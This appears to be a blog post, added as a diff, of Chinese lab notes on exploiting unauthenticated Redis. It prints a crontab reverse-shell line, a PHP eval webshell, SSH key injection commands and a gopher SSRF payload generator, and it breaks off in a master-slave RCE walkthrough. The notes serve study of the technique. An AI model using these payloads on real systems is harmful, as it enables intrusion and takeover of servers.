@@ -1,0 +1,1431 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="redis安全学习, Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>redis安全学习 | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">redis安全学习</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/redis/">
+                                <span class="chip bg-color">redis</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-01-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="redis安全学习笔记"><a href="#redis安全学习笔记" class="headerlink" title="redis安全学习笔记"></a>redis安全学习笔记</h1><h2 id="一-应用介绍"><a href="#一-应用介绍" class="headerlink" title="一. 应用介绍"></a>一. 应用介绍</h2><p>　　Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p>
+<h2 id="二-漏洞介绍"><a href="#二-漏洞介绍" class="headerlink" title="二. 漏洞介绍"></a>二. 漏洞介绍</h2><p>　　Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作</p>
+<h2 id="三-复现环境"><a href="#三-复现环境" class="headerlink" title="三.复现环境"></a>三.复现环境</h2><p>靶机：<code>CentOS Ubuntu</code>、攻击者：<code>Deepin</code></p>
+<p>因为安装的redis是5.0.4版本，所以在配置文件<code>redis.conf</code>中将<code>bind 127.0.0.1</code>前面加上<code>#</code>,也就是允许外网访问，<code>protected-mode no </code>关掉保护模式</p>
+<p>先学习未授权访问redis，再学习通过SSRF利用redis</p>
+<h2 id="四-利用方式"><a href="#四-利用方式" class="headerlink" title="四.利用方式"></a>四.利用方式</h2><p>常规的利用方式有三种：</p>
+<ul>
+<li>利用contrab计划任务反弹shell</li>
+<li>利用绝对路径写webshell</li>
+<li>利用ssh写公钥</li>
+</ul>
+<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><h4 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h4><p>nmap探测一下6379端口有没有开放，可以看到端口开放运行redis</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/giPD3Wkaw91BJxy.png" alt="2.png"></p>
+<p>本地连接一下,命令<code>redis-cli -h ip</code>连接，<code>info</code>查看一些敏感信息</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/1WQYUxpXsGEJNcR.png" alt="1.png"></p>
+<p>先通过contrab计划任务反弹shell试一下</p>
+<pre class=" language-php"><code class="language-php">set xxx <span class="token string">"\n\n*/1 * * * * /bin/bash -i>&amp;/dev/tcp/192.168.80.148/4444 0>&amp;1\n\n"</span>
+config set dir <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>spool<span class="token operator">/</span>cron
+config set dbfilename root
+save</code></pre>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/eDFvJwqLaCUm3Sz.png" alt="5.png"></p>
+<p>监听一下4444端口</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/So2A9CXgYZFcxQt.png" alt="4.png"></p>
+<p>稍微等一会，等定时任务执行，就会收到反弹shell</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/61W2qrIvVog5f4u.png" alt="6.png"></p>
+<p>这是在<code>CentOS</code>上面执行的，但是在<code>Ubuntu</code>上行不通，原因如下：</p>
+<ul>
+<li><p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/</code>权限644也能执行</p>
+</li>
+<li><p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
+</li>
+</ul>
+<p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
+<p>所以这个地方我把反弹shell写到了<code>Ubuntu</code>上面，但定时任务也没有执行</p>
+<h4 id="利用绝对路径写webshell"><a href="#利用绝对路径写webshell" class="headerlink" title="利用绝对路径写webshell"></a>利用绝对路径写webshell</h4><p>通过redis未授权在web目录下写入一句话木马</p>
+<pre class=" language-php"><code class="language-php">config set dir <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html
+set xxx <span class="token string">"\n\n\n&lt;?php @eval($_POST['c']);?>\n\n\n"</span>
+config set dbfilename webshell<span class="token punctuation">.</span>php
+save</code></pre>
+<p>先通过浏览器看看能不能访问到</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/jGHPDnr6u1KwSmN.png" alt="10.png"></p>
+<p>浏览器可以访问到，用蚁剑连接一下试试</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/tpRdNJjfSAevcL2.png" alt="11.png"></p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/MhCckWYyHF6wsEN.png" alt="12.png"></p>
+<h4 id="写SSH公钥"><a href="#写SSH公钥" class="headerlink" title="写SSH公钥"></a>写SSH公钥</h4><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
+<p>生成秘钥不在演示</p>
+<p>将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里：</p>
+<pre class=" language-php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword">echo</span> <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">;</span> cat id_redis_rsa<span class="token punctuation">.</span>pub<span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token operator">-</span>e <span class="token string">"\n\n"</span><span class="token punctuation">)</span> <span class="token operator">></span> key<span class="token punctuation">.</span>txt
+cat <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>key<span class="token punctuation">.</span>txt <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">80.148</span> <span class="token operator">-</span>x set xxx</code></pre>
+<p>然后就是设置目录保存文件了</p>
+<pre class=" language-php"><code class="language-php">config set dir <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>ssh
+config set dbfilename authorized_keys
+save</code></pre>
+<p>最后使用ssh远程连接</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/nkCmPa5rcTOd6QF.png" alt="8.png"></p>
+<p>可以看到不用密码就能登录</p>
+<p>可以看一下authorized_keys的文件内容，里面会有我们写入的公钥和一些缓冲的乱码，这也就是我们为什么要加换行<code>(\n)</code>的原因</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/zuLVxjWwF5k1pGb.png" alt="9.png"></p>
+<h3 id="通过SSRF利用redis"><a href="#通过SSRF利用redis" class="headerlink" title="通过SSRF利用redis"></a>通过SSRF利用redis</h3><h4 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h4><p>地址：<code>https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/</code></p>
+<p>目的：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的<br>访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。<br>找到一个处于none的虚拟机，点击房间名</p>
+<p><img src="https://i.loli.net/2020/09/17/gcfG3pJsmT1K8Eo.png" alt="19.png"></p>
+<p>然后进入这个房间，选择需要创建的虚拟机，选择SSRF Box，点击保存</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/hWa36wEeANC9bSx.png" alt="20.png"></p>
+<p>等待一段时间环境就可以访问了</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/TulGJ7WjZ8dHIaU.png" alt="21.png"></p>
+<p>之后访问这个虚拟机就可以了，因为我这里是用ctf07创建的，所以进的就是<code>http://ctf07.root-me.org/</code></p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/fWmHg4CXbzAGn8v.png" alt="22.png"></p>
+<p>进去之后需要输入一个URL参数，很明显输入一个百度试下</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/bnpRmkSKU64EFw3.png" alt="13.png"></p>
+<p>我们再来试着读一下系统文件<code>/etc/passwd</code></p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/sdU7ZwjuviNhEqb.png" alt="14.png"></p>
+<p>正常来说咱需要爆破一下他的端口号来确定开启那些服务，因为咱原先就知道，这一步就省略了</p>
+<p>当我们访问6378的时候呢，显示的是拒绝连接，这就说明端口并没有开放，访问6379的时候呢端口并不是拒绝连接而是报错了，证明这个端口开放</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/hRYzK25tEw98eOG.png" alt="23.png"></p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/Neknx5JGPs2TjBM.png" alt="24.png"></p>
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<p>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</p>
+<h4 id="利用redis写webshell"><a href="#利用redis写webshell" class="headerlink" title="利用redis写webshell"></a>利用redis写webshell</h4><p>利用脚本(来自<code>By七友</code>师傅)</p>
+<pre class=" language-py"><code class="language-py">import urllib
+protocol="gopher://"
+ip="192.168.163.128"
+port="6379"
+shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
+filename="shell.php"
+path="/var/www/html"
+passwd=""
+cmd=["flushall",
+     "set 1 &#123;&#125;".format(shell.replace(" ","$&#123;IFS&#125;")),
+     "config set dir &#123;&#125;".format(path),
+     "config set dbfilename &#123;&#125;".format(filename),
+     "save"
+     ]
+if passwd:
+    cmd.insert(0,"AUTH &#123;&#125;".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("$&#123;IFS&#125;"," "))))+CRLF+x.replace("$&#123;IFS&#125;"," ")
+    cmd+=CRLF
+    return cmd
+
+if __name__=="__main__":
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload</code></pre>
+<p>生成payload</p>
+<pre class=" language-php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Aredis.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0</span></code></pre>
+<p>发送payload,可以看到页面回显OK,这就代表写入成功了</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/IMLAg4sayhjlBVf.png" alt="17.png"></p>
+<p>但是这个地方我用蚁剑并没有连接上，不知道为啥</p>
+<p>在URL中访问试一下，可以访问到并且能够执行<code>phpinfo()</code></p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/VK3UWLsiMfEr84J.png" alt="16.png"></p>
+<h2 id="Redis-基于主从复制的-RCE-利用方式"><a href="#Redis-基于主从复制的-RCE-利用方式" class="headerlink" title="Redis 基于主从复制的 RCE 利用方式"></a>Redis 基于主从复制的 RCE 利用方式</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce</p>
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点</p>
+<h3 id="建立主从模式的3种方式"><a href="#建立主从模式的3种方式" class="headerlink" title="建立主从模式的3种方式"></a>建立主从模式的3种方式</h3><ul>
+<li>配置文件:在从服务器的配置文件中加入：slaveof &lt;masterip&gt; &lt;masterport&gt;</li>
+<li>启动命令:redis-server启动命令后加入 –slaveof &lt;masterip&gt; &lt;masterport&gt;</li>
+<li>客户端命令:Redis服务器启动后，直接通过客户端执行命令：slaveof &lt;masterip&gt; &lt;masterport&gt;，则该Redis实例成为从节点。</li>
+</ul>
+<p><strong>注意：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p>
+<p>在<code>docker</code>中开启两台<code>redis</code></p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/nNTtaIj8cVq46gE.png" alt="27.png"></p>
+<p>建立主从模式</p>
+<p>查看IP：<code>docker inspect 容器ID</code></p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/F25fX4pNzdTwUnx.png" alt="28.png"></p>
+<p>解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
+<h3 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h3><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
+<p>恶意so文件编写：<code>https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</code></p>
+<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><pre class=" language-php"><code class="language-php"><span class="token constant">SLAVEOF</span> <span class="token constant">IP</span><span class="token punctuation">:</span><span class="token constant">PORT</span>
+<span class="token operator">+</span><span class="token constant">OK</span> 建立主从模式
+<span class="token constant">CONFIG</span> set dbfilename exp<span class="token punctuation">.</span>so
+<span class="token operator">+</span><span class="token constant">OK</span> 设置<span class="token constant">RDB</span>文件    
+<span class="token constant">PING</span> 测试连接是否可用
+<span class="token operator">+</span><span class="token constant">PONG</span> 告诉slave连接可用
+<span class="token constant">REPLCONF</span> 发送<span class="token constant">REPLCONF</span>信息，主要是当前实例监听端口
+<span class="token operator">+</span><span class="token constant">OK</span> 告诉slave成功接受
+<span class="token constant">REPLCONF</span> 发送<span class="token constant">REPLCONF</span> capa告诉master 当前 <span class="token punctuation">(</span>slave<span class="token punctuation">)</span> 的支持能力。 <span class="token constant">REPLCONF</span> capa eof capa psync2
+<span class="token operator">+</span><span class="token constant">OK</span> 告诉slave成功接受
+<span class="token constant">PSYNC</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rundi</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>offest</span><span class="token punctuation">></span></span></span> 发送<span class="token constant">PSYNC</span>　slave使用全量复制并从我们配置的Rouge Server接收module，<span class="token constant">PS</span>：其中        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>runid</span><span class="token punctuation">></span></span></span>无要求，不过长度一般为<span class="token number">40</span>，<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>offest</span><span class="token punctuation">></span></span></span>一般设置为<span class="token number">1</span>
